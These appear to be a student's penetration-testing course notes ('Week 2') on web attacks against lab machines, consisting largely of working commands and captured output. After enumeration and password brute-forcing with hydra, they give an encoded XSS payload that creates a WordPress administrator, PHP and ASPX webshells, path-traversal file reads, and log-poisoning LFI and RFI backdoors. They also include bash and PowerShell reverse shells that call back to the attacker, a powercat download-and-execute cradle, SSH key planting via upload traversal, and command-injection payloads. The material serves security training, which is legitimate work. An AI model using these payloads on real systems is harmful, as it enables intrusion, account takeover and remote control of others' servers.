# Week 2

## nmap http-enum
```bash
sudo nmap -p80  -sV 192.168.50.20
sudo nmap -p80 --script=http-enum 192.168.50.20
```

## Wappalyzer
not gonna use as it requires registration, there are nmap scripts that can provide similar intelligence.
- 

## gobuster
great for finding hidden directories and files on web servers. It uses a wordlist to brute-force URLs and can help identify potential entry points for further exploration.

```bash
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

## burpsuite
Burp Suite is a powerful web application security testing tool. It can be used to intercept and analyze HTTP requests and responses, perform automated scans, and identify vulnerabilities in web applications. It is particularly

Intruder does similar to gobuster but with more options and flexibility. It allows for customized payloads, attack types, and can be used for fuzzing and brute-forcing.

To get SSL traffic to work with burp, you need to install the burp certificate on your browser. You can download it from http://burp and then import it into your browser's certificate store.
Dont forget to setup the proxy in your browser to point to burp (usually localhost:8080).

Default behavior of burp is to intercept html requests, but you can change this in the settings to intercept all requests. This is useful for testing APIs and other non-HTML traffic.

Some web applications will include their hostname in links and redirects. If we don't have an entry in /etc/hosts that matches the web application's hostname, our browser and other tools may not be able to follow these links.

This allows us to access the VM by hostname while bypassing DNS.

kali@kali:~$ cat /etc/hosts 
...
192.168.50.16 offsecwp

## hydra
```bash
hydra -l admin -P passwords.txt 192.168.197.52 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"

Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-24 08:10:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:1/p:30), ~2 tries per task
[DATA] attacking http-post-form://192.168.197.52:80/login.php:username=^USER^&password=^PASS^:F=Login Failed
[80][http-post-form] host: 192.168.197.52   login: admin   password: zeddemore
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-24 08:10:17
```

## api enumeration using gobuster
create pattern
```bash
cat pattern                                
{GOBUSTER}/v1
{GOBUSTER}/v2
```
run gobuster with pattern
```bash
gobuster dir -u http://192.168.197.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.16:5002
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (2 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/users/v1             (Status: 200) [Size: 316]
Progress: 40938 / 40938 (100.00%)
===============================================================
Finished
===============================================================
```
curl to check endpoint
```bash                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~/offsec/8.2.4]
└─$ curl -i http://192.168.197.16:5002/users/v1                                
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 316
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 24 Jun 2026 13:19:35 GMT

{
  "users": [
    {
      "email": "mail1@mail.com", 
      "username": "name1"
    }, 
    {
      "email": "mail2@mail.com", 
      "username": "name2"
    }, 
    {
      "email": "admin@mail.com", 
      "username": "admin"
    }, 
    {
      "email": "pwn@offsec.com", 
      "username": "offsec"
    }
  ]
}

```

find sub endpoints:
```bash
gobuster dir -u http://192.168.197.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.16:5002/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]
Progress: 959 / 959 (100.00%)
===============================================================
Finished
===============================================================
```

## XSS priv esc wordpress visitor plugin
we need to first gather the nonce. We can accomplish this using the following JavaScript function:

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);

```
minimize this and using the following function make sure to replace any bad characters.
```js
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```


minimize js and put in useragent
run the exploit like so:
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```



then we can use the new user to upload a plugin (based on https://www.revshells.com/):
https://jckhmr.net/create-a-wordpress-webshell-plugin/

```php
<?php
/**
* Plugin Name: WonderfulWebshell
* Plugin URI: https://github.com/jckhmr/wonderfullwebshell
* Description: Wordpress webshell used for demo purposes only
* Version: 1.0
* Author: jckhmr
* Author URI: https://jckhmr.net
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
```

zip it and upload and then you can access it like so: `curl -i 'http://offsecwp/wp-content/plugins/mylovelywebshell/mylovelywebshell.php?cmd=cat%20/tmp/flag'`

## Dir traversal
Basic path traversal to find private key:
```bash
curl http://mountaindesserts.local/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```

Use the found private key to ssh into the box:
```bash
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for '/home/kali/dt_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
```
Fix the permissions on the private key file and try again:
```bash
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.local
```

### windows grafana path traversal
Windows grafana has a path traversal vulnerability in the mysql plugin. We can use this to read files on the system.
```bash

└─$ curl -v --path-as-is http://192.168.107.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt              
*   Trying 192.168.107.193:3000...
* Established connection to 192.168.107.193 (192.168.107.193 port 3000) from 192.168.45.157 port 48344 
* using HTTP/1.x
> GET /public/plugins/mysql/../../../../../../../../Users/install.txt HTTP/1.1
> Host: 192.168.107.193:3000
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 38
< Content-Type: text/plain; charset=utf-8
< Expires: -1
< Last-Modified: Wed, 29 Jul 2026 16:37:22 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Wed, 29 Jul 2026 16:48:39 GMT
< 
OS{e13320f6255ce84d841d0155bbe2e41a}
* Connection #0 to host 192.168.107.193:3000 left intact
```

### Bypassing path traversal filters
Some web applications may implement filters to prevent path traversal attacks. However, there are techniques to bypass these filters. For example, if the application blocks the use of "../" in the URL, you can try using URL encoding or double encoding to bypass the filter. For example, you can replace "../" with "%2e%2e%2f" or "%252e%252e%2f". Additionally, you can try using alternative directory traversal sequences, such as "..%2f" or "..%5c" (for Windows systems). 

```bash
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

```bash
curl --path-as-is 'http://192.168.107.16/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords' -vv
10:21:17.353738 [0-0] * [SETUP] added
10:21:17.353957 [0-0] *   Trying 192.168.107.16:80...
10:21:17.354151 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=0
10:21:17.380552 [0-0] * [SETUP] Curl_conn_connect(block=0) -> 0, done=1
10:21:17.380663 [0-0] * Established connection to 192.168.107.16 (192.168.107.16 port 80) from 192.168.45.157 port 48810 
10:21:17.380697 [0-0] * [SETUP] query ALPN
10:21:17.380727 [0-0] * using HTTP/1.x
10:21:17.380915 [0-0] > GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords HTTP/1.1
10:21:17.380915 [0-0] > Host: 192.168.107.16
10:21:17.380915 [0-0] > User-Agent: curl/8.17.0
10:21:17.380915 [0-0] > Accept: */*
10:21:17.380915 [0-0] > 
10:21:17.381685 [0-0] * Request completely sent off
10:21:17.404642 [0-0] < HTTP/1.1 200 OK
10:21:17.404932 [0-0] < Date: Wed, 29 Jul 2026 14:21:16 GMT
10:21:17.405141 [0-0] < Server: Apache/2.4.49 (Unix)
10:21:17.405395 [0-0] < Last-Modified: Wed, 29 Jul 2026 09:53:12 GMT
10:21:17.405597 [0-0] < ETag: "25-657bcec687200"
10:21:17.405814 [0-0] < Accept-Ranges: bytes
10:21:17.406031 [0-0] < Content-Length: 37
10:21:17.406267 [0-0] < 
OS{4e07aa122633ee1e161aac5a8606a261}
10:21:17.406519 [0-0] * Connection #0 to host 192.168.107.16:80 left intact
```

REMINDER: use the `--path-as-is` option in curl to prevent it from normalizing the URL and removing the encoded characters.

### Grafana path traversal
```bash
┌──(kali㉿kali)-[~]
└─$ curl -v --path-as-is http://192.168.107.16:3000/public/plugins/mysql/../../../../../../../../etc/passwd     
*   Trying 192.168.107.16:3000...
* Established connection to 192.168.107.16 (192.168.107.16 port 3000) from 192.168.45.157 port 46350 
* using HTTP/1.x
> GET /public/plugins/mysql/../../../../../../../../etc/passwd HTTP/1.1
> Host: 192.168.107.16:3000
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 975
< Content-Type: text/plain; charset=utf-8
< Expires: -1
< Last-Modified: Thu, 10 Jun 2021 12:02:44 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Wed, 29 Jul 2026 14:23:49 GMT
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
grafana:x:472:0::/home/grafana:/usr/sbin/nologin
* Connection #0 to host 192.168.107.16:3000 left intact
                                                                                                                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ curl -v --path-as-is http://192.168.107.16:3000/public/plugins/mysql/../../../../../../../../opt/install.txt
*   Trying 192.168.107.16:3000...
* Established connection to 192.168.107.16 (192.168.107.16 port 3000) from 192.168.45.157 port 46356 
* using HTTP/1.x
> GET /public/plugins/mysql/../../../../../../../../opt/install.txt HTTP/1.1
> Host: 192.168.107.16:3000
> User-Agent: curl/8.17.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Accept-Ranges: bytes
< Cache-Control: no-cache
< Content-Length: 37
< Content-Type: text/plain; charset=utf-8
< Expires: -1
< Last-Modified: Wed, 29 Jul 2026 09:53:11 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-Frame-Options: deny
< X-Xss-Protection: 1; mode=block
< Date: Wed, 29 Jul 2026 14:23:52 GMT
< 
OS{c6d74c72815429c9f0f8f68dbfb4d12c}
* Connection #0 to host 192.168.107.16:3000 left intact
```

### reverse shell / modify User-Agent 


check your ip using `ip a` and then run the following command to listen for incoming connections:
```bash
nc -nlvp 4444
```
put the correct ip in here and run the following command to get a reverse shell:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.16/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.157%2F4444%200%3E%261%22' 
*   Trying 192.168.107.16:80...
* Established connection to 192.168.107.16 (192.168.107.16 port 80) from 192.168.45.157 port 40376 
* using HTTP/1.x
> GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.157%2F4444%200%3E%261%22 HTTP/1.1
> Host: 192.168.107.16
> Accept: */*
> User-Agent: <?php echo system($_GET['cmd']); ?>
> 
* Request completely sent off
^C
```

### LFI Windows XAMPP
```bash
curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.193/meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir' 
*   Trying 192.168.107.193:80...
* Established connection to 192.168.107.193 (192.168.107.193 port 80) from 192.168.45.157 port 40178 
* using HTTP/1.x
> GET /meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1
> Host: 192.168.107.193
> Accept: */*
> User-Agent: <?php echo system($_GET['cmd']); ?>
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 29 Jul 2026 22:34:40 GMT
< Server: Apache/2.4.49 (Win64) OpenSSL/1.1.1l PHP/7.3.31
< X-Powered-By: PHP/7.3.31
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=UTF-8

 Volume in drive C has no label.
 Volume Serial Number is 84F6-D600

 Directory of C:\xampp\htdocs\meteor

05/03/2022  11:08 AM    <DIR>          .
05/03/2022  10:55 AM    <DIR>          ..
05/03/2022  10:55 AM               453 ABOUT THIS TEMPLATE.txt
05/03/2022  10:55 AM               621 admin.php
05/03/2022  10:55 AM    <DIR>          css
05/03/2022  10:55 AM               265 docker-compose.yml
05/03/2022  10:55 AM               411 Dockerfile
05/03/2022  10:55 AM    <DIR>          fonts
07/29/2026  03:28 PM                38 hopefullynobodyfindsthisfilebecauseitssupersecret.txt
05/03/2022  10:55 AM    <DIR>          img
05/03/2022  10:55 AM             7,129 index.php
05/03/2022  10:55 AM    <DIR>          js
05/03/2022  10:55 AM            72,940 php.ini
05/03/2022  10:55 AM                61 start.sh
               8 File(s)         81,918 bytes
               6 Dir(s)     630,673,408 bytes free
               6 Dir(s)     630,673,408 bytes free"
```

use type to read the file:
```bash
curl -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>" -v --path-as-is 'http://192.168.107.193/meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt' 

192.168.45.157 - - [29/Jul/2026:15:34:40 -0700] "GET /meteor/index.php?page=../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1" 200 27306 "-" "OS{48fa98a62f09aa2cac9fc8bfd3769496}
OS{48fa98a62f09aa2cac9fc8bfd3769496}"
```

## PHP Wrappers
protocol wrappers to enhance the language's capabilities. For example, PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via File Inclusion vulnerabilities in PHP web applications

`php://filter` allows us to apply filters to a file before it is read. This can be used to encode or decode the contents of a file, or to apply other transformations. For example, we can use the `convert.base64-encode` filter to get the contents of a file as a base64 encoded string.

Get content of file as base64 encoded string:
```bash
curl "http://192.168.143.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php"
```
Decode using base64 command:
```bash
echo "<base64_encoded_string>" | base64 -d 
```

`data://` wrapper allows us to include data directly in the URL. This can be used to execute arbitrary PHP code by encoding it in base64 and including it in the URL.

File listing:
```bash
curl "http://192.168.143.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

Cat the file:
```bash
curl "http://192.168.143.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('cat%20/var/www/html/backup.php');?>"
```

Get rid of spaces in the command otherwise it will break the URL.

## Remote file inclusion
Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow_url_include 

first we need something we can execute (kali linux has a few in /usr/share/webshells/php/ for example). 

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

host it
```bash
python3 -m http.server 80
```

then include it in the vulnerable page (use your own IP & off course it should be internet facing or host it in a server somehwere):
```bash
curl "http://mountaindesserts.local/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
```


### Reverse shell using RFI
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

Change ip and port and then host it + start a listener on your machine:
```bash
nc -nlvp 4444
```
Run exploit:

```bash
curl "http://192.168.143.16:8001/meteor/index.php?page=http://192.168.45.244/php-reverse-shell.php"  
``` 
use shell to get the flag.

## Upload vulnerabilities
Alt file extension bypass:
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt

file upload vulnerability that enables us to upload files to be run by the web server. 

Make powershell script to get a reverse shell:
```bash
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ pwsh               
PowerShell 7.5.4

┌──(kali㉿kali)-[/home/kali]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.244",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'                                                                                                                  

┌──(kali㉿kali)-[/home/kali]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)                                                                                                                                                     
┌──(kali㉿kali)-[/home/kali]                                                                                                                                                                                       
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)                                                                                                                                                              

┌──(kali㉿kali)-[/home/kali]
└─PS> $EncodedText
```

Copy the `EncodedText` and then run the following command to get a reverse shell:
```bash
curl -v --path-as-is 'http://192.168.143.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20 <EncodedText>'
```
While having your listener running on your machine:
```bash
nc -nlvp 4444
```

### Windows reverse shell using RFI (capstone ctf)
Ran service discovery against `192.168.223.192` with:
`sudo nmap -sS --script http-title 192.168.223.192`
which identified IIS Windows Server on `80/tcp` ad `8000/tcp`
8000 was the main website and contained an upload form. Uploaded files where uploaded to the 80 webroot. 

Kali comes with some webshells :
- `ls /usr/share/webshells/aspx` -> `cmdasp.aspx`
- `cat /usr/share/webshells/aspx/cmdasp.aspx` (ASP.NET webshell that executes commands via `cmd.exe`)
upload the cmdasp.aspx webshell and access it on port 80.

Encoded a PowerShell reverse shell command to Base64 like in [[Week 2#Upload vulnerabilities]], and started your listener on Kali:
`nc -nvlp 4444`

After the reverse shell connected, navigated the IIS web root on the target:

### upload without executable options
If the upload endpoint is writable and SSH is available, you can use it to place a public key into the target's authorized keys and then log in over SSH.

```bash
# 1) Upload a file with curl
curl -X POST -F 'myFile=@hosts.txt;filename=hosts.txt' 'http://mountaindesserts.local:8000/upload'

# 2) If the app writes somewhere restricted, use ../ to change the target path
curl -X POST -F 'myFile=@dessert.pub;filename=../../../../../../../root/.ssh/authorized_keys' 'http://mountaindesserts.local:8000/upload'

# 3) Generate a key pair and upload the public key
ssh-keygen -f dessert
curl -X POST -F 'myFile=@dessert.pub;filename=../../../../../../../root/.ssh/authorized_keys' 'http://mountaindesserts.local:8000/upload'

# 4) Connect with SSH
ssh -p 2222 -i dessert root@mountaindesserts.local
```

The idea is simple: use curl to upload a file, use path traversal with ../ to place it in a useful location, and then use the uploaded public key to authenticate over SSH.

## Command injection to pop a shell
If the app filters the input, try prepending a harmless prefix such as `git;` so the server accepts the request and still executes the real payload after the separator.
Useful test payloads:

```bash
curl -X POST --data 'Archive=git%3Bid' 'http://TARGET/archive'
curl -X POST --data 'Archive=git%3Bdir' 'http://TARGET/archive'
```

- If `git;` works, use it as the wrapper for the actual command:

```bash
curl -X POST --data 'Archive=git%3B<real command here>' 'http://TARGET/archive'
```

In some cases `gitgit;...` also worked, but the first command's output was not visible, so `git;...` is the cleaner choice.

```bash
# PowerShell check
curl -X POST --data 'Archive=gitgit%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' 'http://192.168.223.189:8000/archive'
```

handy snippet, published by PetSerAl that displays "CMD" or "PowerShell" depending on where it is executed.

```text
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

If that returns Powershell, use the PowerShell Empire / PowerCat payload below.

```bash
# host payload
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8080

# listener
nc -nvlp 4444

# trigger
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<YOUR_IP>:8080%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<YOUR_IP>%20-p%204444%20-e%20powershell' 'http://TARGET/archive'
```

If PowerShell is not available, switch to a non-PowerShell reverse shell payload instead.

### Linux reverse shell

```bash
└─$ curl -X POST --data 'Archive=gitgit%3Bid' 'http://192.168.223.16/archive'
Repository successfully cloned with command: gitgit;id and output: uid=1000(stanley) gid=1000(stanley) groups=1000(stanley),27(sudo)
└─$ curl -X POST --data 'Archive=gitgit%3Bls' 'http://192.168.223.16/archive'
Repository successfully cloned with command: gitgit;ls and output: css
fonts
img
index.html
js
main
start.sh
                                                                                                                                                                                       └─$ curl -X POST --data 'Archive=gitgit%3Bbash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.249%2F4444%200%3E%261%22' 'http://192.168.223.16/archive'
Repository successfully cloned with command: gitgit;bash -c "bash -i >& /dev/tcp/192.168.45.249/4444 0>&1" and output:                                                                                                                                                                                                          

└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.249] from (UNKNOWN) [192.168.223.16] 46326
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
stanley@00f986a16127:/app$ ls
ls
css
fonts
img
index.html
js
main
start.sh
              
```

#### capstone ctf linux
Vulnerable web application that has a command injection vulnerability in the login form. Python application.
We can get to some of the source by ommitting some parameter:
```python
   if request.method == 'POST':
            if request.form['username'] != 'N@NdkWzmN@NdkWzmN@NdkWzm' or request.form['password'] != 'N@NdkWzmN@NdkWzmN@NdkWz!!!!!!###!!!!!m':
                ffa = request.form['ffa']
                out = os.popen(f'echo "{ffa}"').read()
                if out == (random_string+random_string2):
                    output = "FFA was correct!"
                else:
```

Common first payloads to try for command execution in this style are:

";id;#
"$(id)" (if command substitution is possible in that quoting context)
";uname -a;#


```bash
curl -s 'http://192.168.223.16/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "username=test" \
  --data-urlencode "password=test" \
  --data-urlencode 'ffa=";sudo /bin/bash -c '\''bash -i >& /dev/tcp/192.168.45.249/4444 0>&1'\'';#'
```
use `sudo su` to get root and then `cat /root/flag.txt` to get the flag.